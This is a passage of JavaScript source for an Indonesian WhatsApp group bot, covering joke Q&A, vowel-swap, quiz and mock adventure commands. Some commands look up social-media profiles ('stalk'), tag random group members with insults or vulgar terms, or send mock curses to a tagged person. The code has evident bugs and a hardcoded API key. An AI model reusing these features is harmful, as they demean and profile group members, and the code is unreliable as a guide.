				const kapan =['Yo ndak tau kok tanya saya','Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lagi','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
				const koh = kapan[Math.floor(Math.random() * kapan.length)]
				client.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
				await limitAdd(sender)
				break
				case 'apakah':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				apakah = body.slice(1)
				const apa =['Iya','Tidak','Gatau males lagi badmod','Bisa Jadi','Coba Ulangi']
				const kah = apa[Math.floor(Math.random() * apa.length)]
				client.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
				await limitAdd(sender)
				break
				case 'bagaimanakah':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				bagaimanakah = body.slice(1)
				const bagai =['Bawel ih..','Kita Kenal?','Nanya Terus deh','Tidak Tahu','Coba Ulangi','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan']
				const mana = bagai[Math.floor(Math.random() * bagai.length)]
				client.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: mek })
				await limitAdd(sender)
				break
				case 'watak':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				watak = body.slice(1)
				const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
				const tak = wa[Math.floor(Math.random() * wa.length)]
				client.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: mek })
				await limitAdd(sender)
				break
				case 'hobi':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				hobby = body.slice(1)
				const hob =['Memasak','Membantu Emak','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Ngomong  Sendiri kek orang gila:v']
				const by = hob[Math.floor(Math.random() * hob.length)]
				client.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
				await limitAdd(sender)
				break
				case 'tagme':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
					var Renenoms = mek.participant
					const tagx = {
					text: `@${Renenoms.split("@s.whatsapp.net")[0]}\nHalo kakak, udah Reneasy tag tuh 😊`,
					contextInfo: { mentionedJid: [Renenoms] }
					}
					client.sendMessage(from, tagx, text, {quoted: mek})
					await limitAdd(sender)
			break
					case 'purba':
					case 'bpurba': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: Fernazer`)
					gatauda = body.slice(7)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/bahasapurba?apikey=${lolkey}&text=${gatauda}`)
					reply(anu.result)
					break
					/*case 'BK':
					case 'bk':
					case 'besarkecil': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: Fernazer`)
					gatauda = body.slice(12)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/upperlower?apikey=${lolkey}&text=${gatauda}`)
					reply(anu.result)
					break*/
					case 'hilih':
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
                if (isLimit(sender)) return reply(ind.limitend(pusname))
					try {
					quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
					i = (teks) => {
					return teks.replace(/['a','i','u','e','o','A','I','U','E','O']/g, "i");
					}
					reply(i(quotedText))
					limitAdd(sender)
					} catch {
					if (args.length < 1) return reply('Teksnya mana kak?')
					i = (teks) => {
					return teks.replace(/['a','i','u','e','o','A','I','U','E','O']/g, "i");
					}
					reply(i(args.join(' ')))
					limitAdd(sender)
					}
					await limitAdd(sender)
					break
			case 'holoh':
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
                if (isLimit(sender)) return reply(ind.limitend(pusname))
					try {
					quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
					o = (teks) => {
					return teks.replace(/['a','i','u','e','o','A','I','U','E','O']/g, "o");
					}
					reply(o(quotedText))
					limitAdd(sender)
					} catch {
					if (args.length < 1) return reply('Teksnya mana kak?')
					o = (teks) => {
					return teks.replace(/['a','i','u','e','o','A','I','U','E','O']/g, "o");
					}
					reply(o(args.join(' ')))
					limitAdd(sender)
					}
					await limitAdd(sender)
					break
			case 'halah':
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
                if (isLimit(sender)) return reply(ind.limitend(pusname))
					try {
					quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
					az = (teks) => {
					return teks.replace(/['a','i','u','e','o','A','I','U','E','O']/g, "a");
					}
					reply(az(quotedText))
					limitAdd(sender)
					} catch {
					if (args.length < 1) return reply('Teksnya mana kak?')
					az = (teks) => {
					return teks.replace(/['a','i','u','e','o','A','I','U','E','O']/g, "a");
					}
					reply(az(args.join(' ')))
					limitAdd(sender)
					}
					await limitAdd(sender)
					break
			case 'heleh':
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
                if (isLimit(sender)) return reply(ind.limitend(pusname))
					try {
					quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
					e = (teks) => {
					return teks.replace(/['a','i','u','e','o','A','I','U','E','O']/g, "e");
					}
					reply(e(quotedText))
					limitAdd(sender)
					} catch {
					if (args.length < 1) return reply('Teksnya mana kak?')
					e = (teks) => {
					return teks.replace(/['a','i','u','e','o','A','I','U','E','O']/g, "e");
					}
					reply(e(args.join(' ')))
					limitAdd(sender)
					}
					await limitAdd(sender)
					break
			case 'huluh':
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())
                if (isLimit(sender)) return reply(ind.limitend(pusname))
					try {
					quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
					u = (teks) => {
					return teks.replace(/['a','i','u','e','o','A','I','U','E','O']/g, "u");
					}
					reply(u(quotedText))
					limitAdd(sender)
					} catch {
					if (args.length < 1) return reply('Teksnya mana kak?')
					u = (teks) => {
					return teks.replace(/['a','i','u','e','o','A','I','U','E','O']/g, "u");
					}
					reply(u(args.join(' ')))
					limitAdd(sender)
					}
					await limitAdd(sender)
					break
               case 'namaninja':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				if (args.length < 1) return reply('kasih teks lah^_^!!!')
				data = await fetchJson(`https://api.terhambar.com/ninja?nama=${body.slice(11)}`)
				reply(data.result.ninja)
			        await limitAdd(sender)
//=================== BATES MAKER MENU ==============//
                    case 'udara':
                    if (args.length < 1) return reply(`PILIH ARAH/CARA CONTOH\n${prefix}udara tembak cepet`)
                    FC = body.slice(7)
                    setTimeout( () => {
                    reply(`[ *PERINTAH OTW STAH* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${FC}* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU STAH* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN MASTAH MENDAPATKAN* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *WOW MASTAH MENDAPATKAN* ]\n[ *${buruh33}* ]`)
                    }, 20000)
                    break
                    case 'darat':
                    if (args.length < 1) return reply(`PILIH ARAH/CARA CONTOH\n${prefix}darat tembak perlahan`)
                    FC = body.slice(7)
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN STAH* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${FC}* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU STAH* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN MASTAH MENDAPATKAN* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *WOW MASTAH MENDAPATKAN* ]\n[ *${buruh22}* ]`)
                    }, 20000)
                    break
                    case 'laut':
                    if (args.length < 1) return reply(`PILIH ARAH/CARA CONTOH\n${prefix}laut tembak perlahan`)
                    FC = body.slice(6)
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN STAH* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${FC}* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU STAH* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN MASTAH MENDAPATKAN* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *WOW MASTAH MENDAPATKAN* ]\n[ *${buruh11}* ]`)
                    }, 20000)
                    break
                    
//BATES NGAB STALKING MENU
			       case 'githubstalk':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				hmms = await fetchJson(`https://pencarikode.xyz/stalk/github?q=${body.slice(13)}&apikey=pais`)
				buffer = await getBuffer(hmms.result.avatar_url)
				hasil = `Fullname : ${hmms.result.username}\nPengikut : ${hmms.result.followers}\nMengikuti : ${hmms.result.following}\nLink Blog : ${hmms.result.blog}\nUrl Github : ${hmms.result.url}\nbio : ${hmms.result.bio}`
				client.sendMessage(from, buffer, image, {quoted: mek, caption: hasil})
				await limitAdd(sender)
				break
				case 'igstalk':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				hmm = await fetchJson(`https://api.zeks.xyz/api/igstalk?username=${body.slice(9)}&apikey=${ZeksApi}`)
				buffer = await getBuffer(hmm.profile_pic)
				hasil = `Fullname : ${hmm.fullname}\nPengikut : ${hmm.follower}\nMengikuti : ${hmm.following}\nPrivate : ${hmm.is_private}\nVerified : ${hmm.is_verified}\nbio : ${hmm.bio}`
				client.sendMessage(from, buffer, image, {quoted: mek, caption: hasil})
				await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
			break
		case 'tiktokstalk':
			if (!isRegistered) return reply(ind.noregis())
			username = args[0]
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${username}?apikey=${lolkey}`, {method: 'get'})
					get_result = get_result.result
					txt = `Link : ${get_result.username}\n`
					txt += `Bio : ${get_result.bio}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.followings}\n`
					txt += `Likes : ${get_result.likes}\n`
					txt += `Vidio : ${get_result.video}\n`
					buffer = await getBuffer(get_result.user_picture)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: txt})
					break

//===================== BATES COK KALO MAU NAMBAHIN FITUR DISINI COK KE BAWAH AJA ===========//
                    
            
					case 'ingfo':  
                    if (isBanned) return reply(ind.baned())              
				    if (!isGroup) return reply(`GRUP ONLY`)
					if (!isGroupAdmins) return reply(`LU ADMIN??`)
					var value = body.slice(7)
					var group = await client.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: `[ *INGFO TERBARU!!!* ]\nDARI : *${pushname}*\nINGFO : *${value}*`,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					client.sendMessage(from, options, text, {quoted: mek})				
                    break
                    case 'map':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				anu = await fetchJson(`https://mnazria.herokuapp.com/api/maps?search=${body.slice(5)}`, {method: 'get'})
				buffer = await getBuffer(anu.gambar)
				client.sendMessage(from, buffer, image, {quoted: mek, caption: `${body.slice(5)}`})
				await limitAdd(sender)
				break
				case 'ocr': 
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						reply(ind.wait())
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply('kirim foto dengan caption ${prefix}ocr')
					}
					await limitAdd(sender)
				break
// CASE BY FERNAZER
                    case 'gantengcek':
                    N = `KE *GANTENGAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 😎`
                    reply(N)
                    break 
                    case 'cantikcek':
                    N = `KE *CANTIKAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}% 😁*`
                    reply(N)
                    break
                    case 'jelekcek':
                    N = `KE *J3L3K4N* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 🤢`
                    reply(N)
                    break 
                    case 'goblokcek':
                    N = `KE *GOBLOKAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 🤣`
                    reply(N)
                    break 
                    case 'begocek':
                    N = `KE *BEGO* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 😂`
                    reply(N)
                    break 
                    case 'pintercek': 
                    N = `KE *PINTARAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 😗`
                    reply(N)
                    break 
                    case 'jagocek': 
                    N = `KE *JAGOAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 💪`
                    reply(N)
                    break 
                    case 'nolepcek': 
                    N = `KE *NOLEPAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 🧐`
                    reply(N)
                    break 
                    case 'babicek': 
                    N = `KE *BABIAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 🤪`
                    reply(N)
                    break 
                    case 'bebancek':
                    N = `KE *BEBANAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 🤬`
                    reply(N)
                    break 
                    case 'baikcek': 
                    N = `KE *BAIKAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 😇`
                    reply(N)
                    break 
                    case 'jahatcek': 
                    N = `KE *JAHATAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 😈`
                    reply(N)
                    break 
                    case 'anjingcek': 
                    N = `KE *ANJINGAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 👀`
                    reply(N)
                    break                      
                    case 'haramcek':
                    N = `KE *HARAMAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 🥴`
                    reply(N)
                    break  
                    case 'kontolcek': 
                    N = `KE *KOMTOLAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 🙂`
                    reply(N)
                    break 
                    case 'pakboycek': 
                    N = `KE *PAKBOYZ* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 😏`
                    reply(N)
                    break 
                    case 'pakgirlcek':	
                    N = `KE *PAKGILR* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 😏`
                    reply(N)
                    break             
                    case 'sangecek':
                    N = `JIWA *SANGE* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 🤤`
                    reply(N)
                    break
                    case 'bapercek':
                    N = `JIWA *BEPERAN* KAMU\n`
                    N += `ADALAH : *${fernazer3}${fernazer4}%* 😘`
                    reply(N)
                    break
                    
                    
                    // TAG MENU 
                     case 'ganteng': case 'cantik': case 'jelek': case 'goblok':  
       case 'bego': case 'pinter': case 'jago': case 'nolep': case 'monyet':                 	 
       case 'babi': case 'beban': case 'baik': case 'jahat': case 'anjing': 
       case 'haram': case 'kontol': case 'pakboy': case 'pakgirl': 
   	case 'wibu': case 'hebat': case 'sadboy': case 'sadgirl':  
               	   if (!isRegistered) return reply( ind.noregis())
			       if (isLimit(sender)) return
			       await limitAdd(sender)
				   if (!isGroup) return reply(`GROUP ONLY`)
 				   jds = []
				   const A1 = groupMembers
  		 		   const B1 = groupMembers
 				   const C1 = A1[Math.floor(Math.random() * A1.length)]
				   D1 = `yang *ter${command}* disini adalah @${C1.jid.split('@')[0]}`                  
				   jds.push(C1.jid)
				   mentions(D1, jds, true)
				   break
				   case 'santet':
            if (!isGroup) return reply('Perintah ini hanya bisa di gunakan dalam group!')
            if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply(`Tag member yang mau disantet\n\nContoh : ${prefix}santet @tag | kalo berak kaga di siram`)
             if (args.length === 1) return reply(`Masukkan alasan kenapa menyantet dia!!\n\nContoh : ${prefix}santet @tag | kalo berak kaga di siram`)
             santet = ['Muntah Paku','Meninggoy','Meninggal','Berak Paku','Muntah Rambut','Muntah Jembut','Ketempelan MONYET!!!','Ketempelan Tuyul','Berak di Celana Terus','Menjadi Gila','Menjadi Bodoh','Berak Beling','Berak Batu']
              terima1 = santet[Math.floor(Math.random() * (santet.length))]
               target = args.split('|')[0]
               alasan = args.split('|')[1]
               client.sendMessage(from, `Santet terkirim ke @${target.split('@')[0]}\n\nAlasan: ${alasan}\n\nJenis Santet Yang di Terima:\n*${terima1}*`, text, {quoted: mek, contextInfo:{ mentionedJid: [target]}})
			break
                
                    // SEARCHING
                    /*case 'gimage':
                    if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				    if (isBanned) return reply(ind.baned())
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=${query}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break*/
                    // FIX EROR BY FERNAZER
                /*case 'gimage2':
                    if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				    if (isBanned) return reply(ind.baned())
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/gimage2?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_buffer = await getBuffer(get_result[x])
                        client.sendMessage(from, ini_buffer, image)
                    }
                    break*/
                    // FIX EROR BY FERNAZER
                /*case 'konachan':
                    if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				    if (isBanned) return reply(ind.baned())
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} azur_lane`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/konachan?apikey=${lolkey}&query=${query}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break*/
                    // FIX EROR BY FERNAZER
                /*case 'wallpapersearch':
                    if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				    if (isBanned) return reply(ind.baned())
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/wallpaper?apikey=${lolkey}&query=${query}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break*/
                    // FIX EROR BY FERNAZER
                /*case 'wallpapersearch2':
                    if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				    if (isBanned) return reply(ind.baned())
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wallpaper2?apikey=${lolkey}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break*/
                    
                    
                    // ADD LEVELING TEST NGAB KLO EROR LAPOR GUE
                    if (isLimit(sender)) return reply(ind.limitend(pusname))
                    case 'petualang':
                    if (args.length < 1) return reply(`FORMAT SALA CARA CONTOH\n${prefix}petualang Darma`)
                    ASU = body.slice(11)
                    setTimeout( () => {
                    reply(`[ *sedang petualang...* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${ASU}* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *tenaga mu berkurang karna berpetualang kejauhan* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *BERHASIL PETUALANG DAN KAMU MEPEROLEH* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *WAH KMU HEBAT LANJUTKAN PERJUANGAN MU* ]\n[ *${buruh22}* ]\n[ INFORMASI *${prefix}halal* ]`)
                    }, 20000)
                    break
                    if (isLimit(sender)) return reply(ind.limitend(pusname))
                    case 'adventure':
                    if (args.length < 1) return reply(`FORMAT SALAH CONTOH\n${prefix}jalan2 jakarta`)
                    ASU = body.slice(11)
                    setTimeout( () => {
                    reply(`[ *sedang adventur ${pushname}* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${ASU}* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *NYAWA MU BERKURANG -67 KARNA ADVENTUR KE ${ASU}* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *TERUSKAN PERJUANGAN MU* ]\n[ *${buruh33}* ]\n[ INFORMASI *${prefix}halal* ]`)
                    }, 20000)
                    break
                    case 'inventori':
                    if (args.length < 1) return reply(`FORMAT SALAH CONTOH\n${prefix}inventori 1`)
                    ASU = body.slice(11)
                    setTimeout( () => {
                    reply(`[ *membuka tas ${pushname}* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${ASU}* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *ISI TAS KAMU MASIH SEDIKIT TERUSLAH BERPETUALANG AGAR DPT ITEM YG BANYAK* ]\n[ *${buruh4}* ]\n[ INFORMASI *${prefix}cari yg halal bero* ]`)
                    }, 20000)
                    break
                    
                    // wahai
                    /*case 'randompatrick':
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    anu = await getBuffer(`http://lolhuman.herokuapp.com/api/sticker/patrick?apikey=${lolkey}`)
                    client.sendMessage(from, anu, sticker, {quoted:mek})
                    break*/
                    /*case 'stickanjing':
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    anu = await getBuffer(`http://lolhuman.herokuapp.com/api/sticker/anjing?apikey=${lolkey}`)
                    clieny.sendMessage(from, anu, sticker, {quoted:mek})
                    break*/
                    /*case 'stickbucin':
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    anu = await getBuffer(`http://lolhuman.herokuapp.com/api/sticker/bucinstick?apikey=${lolkey}`)
                    client.sendMessage(from, anu, sticker, {quoted:mek})
                    break*/
                    /*case 'gawrgura':
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    anu = await getBuffer(`http://lolhuman.herokuapp.com/api/sticker/gawrgura?apikey=${lolkey}`)
                    client.sendMessage(from, anu, sticker, {quoted:mek})
                    break*/
                    
                    
                    // GAME MENU
                    
                    case 'oxo':                    
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    oxz1 = `[ ${oxo11} ]\n`
                    oxz1 += `[ ${oxo22} ]\n`
                    oxz1 += `[ ${oxo33} ]\n`
                    reply(oxz1)
					break
		/*case 'pesan':
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
					if (!isGroup) return reply('GRUB ONLY')
				    if (args.length < 1) return reply(`[❗] CONTOHH??\n${prefix}${command}pesan @tagmember|halo kak`)
					var FG = body.slice(8)
					var F1 = FG.split("|")[0];
					var F2 = FG.split("|")[1];
					client.sendMessage(`${F1}@s.whatsapp.net`, `DARI ${pushname}\nPESAN : ${F2}`, text, {quoted:mek})
					reply('PESAN SUDAH TERKIRIM')
					break*/
                    case 'suit':  
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    F = body.slice(6)
                    if (args.length < 1) return reply(`[❗] Example :\n*${prefix}${command} batu`)
                    anu = await fetchJson(`https://api.xteam.xyz/game/suit?q=${F}&APIKEY=${Xteam}`)
                    anu1 = `➻ *KAMU* : ${anu.jawabanmu}\n`
                    anu1 += `➻ *BOT* : ${anu.jawabanbot}\n`
                    anu1 += `➻ *HASIL* : ${anu.hasil}\n`
                    anu1 += `➻ *POINT* : ${anu.poin}\n`
                    reply(anu1)
                    break
        case 'tebakangka':  
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    F = body.slice(12)
                    if (args.length < 1) return reply(`[❗] Example :\n*${prefix}${command} 9`)
                    anu = await fetchJson(`https://api.xteam.xyz/game/tebakangka?q=${F}&APIKEY=${Xteam}`)
                    anu1 = `➻ *KAMU* : ${anu.jawabanmu}\n`
                    anu1 += `➻ *BOT* : ${anu.jawabanbot}\n`
                    anu1 += `➻ *HASIL* : ${anu.hasil}\n`
                    anu1 += `➻ *POINT* : ${anu.poin}\n`
                    reply(anu1)
                    break
        case 'tebakbendera':  
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    anu = await fetchJson(`https://api.xteam.xyz/game/tebakbendera?APIKEY=${Xteam}`)
                    anu1 = `➻ *SOAL* : INI BENDERA APA?? ${anu.bendera} TEBAK!! WAKTU 60 DETIK`
                    anu2 = `➻ *JAWABAN* : ${anu.jawaban}\nSELAMAT YG TELAH MENJAWAB BENAR`
                    setTimeout( () => {
                    client.sendMessage(from, anu1, text, {quoted: mek})
                    }, 1)
                    setTimeout( () => {
                    costum('50 Detik lagi', text, tescuk, cr)
                    }, 10000)                                                                                                                                   
                    setTimeout( () => {
                    costum('40 Detik lagi', text, tescuk, cr)
                    }, 20000)    
                    setTimeout( () => {
                    costum('30 Detik agi', text, tescuk, cr)
                    }, 30000)    
                    setTimeout( () => {
                    costum('20 Detik lagi', text, tescuk, cr)
                    }, 40000)                                       
                    setTimeout( () => {
                    costum('10 Detik lagi', text, tescuk, cr)
                    }, 50000)                                                                                                                                                     
                    setTimeout( () => {
                    client.sendMessage(from, anu2, text,{quoted: mek})                   
                    }, 60000)                                                                          
                    break     
        case 'kata':  
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    if (args.length < 1) return reply(`[❗] Example :\n*${prefix}${command} gadisuruh makan sama bebeb_-&by ${pushname}`)
			 	    var F = body.slice(6)
			        var F1 = F.split("&")[0];
			        var F2 = F.split("&")[1];
                    anu = await getBuffer(`https://api.xteam.xyz/quotemaker?text=${F1}&wm=${F2}&APIKEY=${Xteam}`)
                    client.sendMessage(from, anu, image, {quoted: mek})
                    break
                    
                    // SEMOJI
                    
                    
                    
                    // HALAH
                    
                    
                    case 'anakharamserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}anakharamserti kuy*`)
				reply(ind.wait())
				ct = body.slice(15)
